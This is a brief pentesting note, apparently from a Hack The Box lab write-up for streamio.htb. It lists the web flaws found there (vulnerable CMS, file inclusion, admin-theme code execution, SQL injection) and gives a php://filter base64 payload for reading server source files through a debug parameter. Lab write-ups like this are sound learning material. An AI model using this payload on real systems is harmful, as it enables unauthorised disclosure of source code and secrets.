## Web Service Enumeration & Exploitation

- When the web service is present, a vulnerable version of CMS can be found  
- LFI and RFI can be found  
- RCE in the admin dashboard (using themes)  
- SQL injection can be found  

### Base64 File Retrieval via PHP

To get a file through PHP by base64 encoding, use the following format as a parameter:

`php://filter/convert.base64-encode/resource=master.php`

**Example:**

`streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php`
